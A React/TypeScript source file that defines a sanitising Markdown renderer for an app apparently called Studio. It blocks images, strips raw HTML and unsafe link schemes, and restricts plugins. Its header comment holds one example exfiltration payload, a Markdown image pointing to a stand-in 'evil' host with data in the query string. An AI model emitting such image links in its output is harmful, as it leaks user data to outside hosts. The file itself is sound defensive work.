import React from "react";
import ReactMarkdown, { defaultUrlTransform, type Components, type Options } from "react-markdown";
import remarkGfm from "remark-gfm";
import { remarkCitations, type CitationSource } from "@/components/chat/citations";

/**
 * The one set of rules for rendering model or user text as Markdown in Studio. Every
 * `<ReactMarkdown>` in apps/studio goes through `SafeMarkdown` (a guard test enforces it), because
 * that text can carry tenant content (uploaded knowledge, retrieved documents):
 *
 * - Never an `<img>`: an image URL is fetched with no click, so `![x](https://evil/?d=…)` would
 *   exfiltrate data the moment an operator opens the page. Images render as their alt text only
 *   (nothing when there is no alt text), and no preload or other element carries the URL.
 * - `skipHtml`: raw HTML in the text is dropped, never rendered.
 * - Links: only http(s), mailto and in-app relative URLs survive (`javascript:` and `data:` are
 *   stripped, and so are protocol-relative `//host` and `\\host` hrefs). The href is resolved
 *   against this origin: another origin opens in a new tab with `rel="noopener noreferrer nofollow"`.
 * - Remark plugins are fixed: GFM, plus the chat's `[n]` citations when `citations` is given. No
 *   caller can add one (a plugin could emit iframe, video or source nodes).
 */

/** The `urlTransform` every safe render uses: react-markdown's default (drops javascript:, data:,
 * vbscript: and unknown protocols) applied to links; image sources never reach the DOM anyway. */
export const safeUrlTransform: NonNullable<Options["urlTransform"]> = (url) => defaultUrlTransform(url);

/** An image as its alt text: never an `<img>`, never the URL. */
export function SafeImage({ alt }: { alt?: string | null }) {
  return alt ? (
    <span data-testid="markdown-image-alt" className="text-muted-foreground">
      [image: {alt}]
    </span>
  ) : null;
}

/**
 * How an href is rendered: `null` drops it (protocol-relative `//host` or `\\host`, which a
 * browser resolves to another host, or anything unparsable), `external` for another origin (or
 * mailto:), `internal` for this origin.
 */
export function linkKind(href: string, origin: string = typeof window === "undefined" ? "http://localhost" : window.location.origin): "internal" | "external" | null {
  const trimmed = href.trim();
  if (trimmed.startsWith("//") || trimmed.startsWith("\\") || trimmed.startsWith("/\\") || trimmed.startsWith("\\/")) return null;
  let url: URL;
  try {
    url = new URL(trimmed, origin);
  } catch {
    return null;
  }
  if (url.protocol !== "http:" && url.protocol !== "https:" && url.protocol !== "mailto:") return null;
  return url.origin === new URL(origin).origin ? "internal" : "external";
}

/** A link: another origin opens in a new tab with no opener or referrer; an in-app link stays in
 * the tab; anything dropped (by the URL transform or `linkKind`) renders as plain text. */
export function SafeLink({ href, children, title }: { href?: string | null; children?: React.ReactNode; title?: string | null }) {
  const kind = href ? linkKind(href) : null;
  if (!href || kind === null) return <span>{children}</span>;
  if (kind === "external") {
    return (
      <a href={href} title={title ?? undefined} target="_blank" rel="noopener noreferrer nofollow">
        {children}
      </a>
    );
  }
  return (
    <a href={href} title={title ?? undefined}>
      {children}
    </a>
  );
}

/** The component overrides every safe render starts from. Callers may override `a` (e.g. chat
 * citations, which fall back to `SafeLink`) but never `img`. */
export const safeMarkdownComponents: Components = {
  img: ({ alt }) => <SafeImage alt={alt} />,
  a: ({ href, children, title }) => (
    <SafeLink href={href} title={title}>
      {children}
    </SafeLink>
  ),
};

export interface SafeMarkdownProps {
  children: string;
  /** The `retrieve` sources `[n]` markers link to (chat): adds the citations plugin, the only
   * plugin besides GFM. */
  citations?: ReadonlyMap<number, CitationSource> | null;
  /** Extra component overrides; `img` is always the safe one. */
  components?: Omit<Components, "img">;
}

/** Model or user text as Markdown under the safe rules above. */
export function SafeMarkdown({ children, citations, components }: SafeMarkdownProps) {
  // The allowlist: no other plugin can be passed in (see safe-markdown.guard.test.ts).
  const plugins = React.useMemo(() => (citations ? [remarkGfm, remarkCitations(citations)] : [remarkGfm]), [citations]);
  return (
    // The only ReactMarkdown in Studio: see safeMarkdown.guard.test.ts.
    <ReactMarkdown
      remarkPlugins={plugins}
      components={{ ...safeMarkdownComponents, ...components, img: safeMarkdownComponents.img }}
      urlTransform={safeUrlTransform}
      skipHtml
    >
      {children}
    </ReactMarkdown>
  );
}
